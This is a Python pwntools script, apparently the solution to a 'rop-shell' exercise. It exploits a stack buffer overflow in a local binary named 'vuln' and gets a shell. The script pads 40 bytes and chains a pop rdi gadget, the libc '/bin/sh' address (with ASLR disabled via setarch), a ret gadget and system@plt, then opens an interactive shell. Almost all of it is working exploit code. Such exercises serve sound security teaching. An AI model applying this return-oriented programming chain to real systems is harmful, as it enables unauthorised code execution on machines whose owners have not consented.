#!/usr/bin/env python

"""
Solution (exploit) for rop-shell task.

Use pwntools (https://docs.pwntools.com/en/latest/) to overwrite the return
address of main() and call system("/bin/sh").
"""

from pwn import *
'''
setarch $(uname -m) -R /bin/bash
'''
io = process("./vuln")
elf = ELF("./vuln")

system_plt_address = p64(elf.plt.system)

libc_base = 0x00007ffff7dca000


log.success(f'LIBC Addr: {hex(libc_base)}')
'''
strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | egrep '/bin/sh'
 19604f /bin/sh
'''
bin_sh_offset = 0x19604f + libc_base

# TODO: Fill required addresses.
offset = 32
pop_rdi_ret_address = 0x0000000000400713 # ROPgadget --binary vuln | grep rdi
ret_gadget = 0x0000000000400506 # ROPgadget --binary vuln | grep ret
log.success(f'SH Addr: {hex(bin_sh_offset)}')

'''
#Won't work since it has problems at packing inside a word
# TODO: Craft payload.
payload = flat(offset * b'A',
               pop_rdi_ret_address,
               bin_sh_offset,
               system_plt_address,
               ret_gadget)
               '''
payload = 40 * b'A'  + p64(pop_rdi_ret_address) + p64(bin_sh_offset) + p64(ret_gadget) + system_plt_address

msg = io.recvuntil(': ')
io.sendline(payload)

io.interactive()
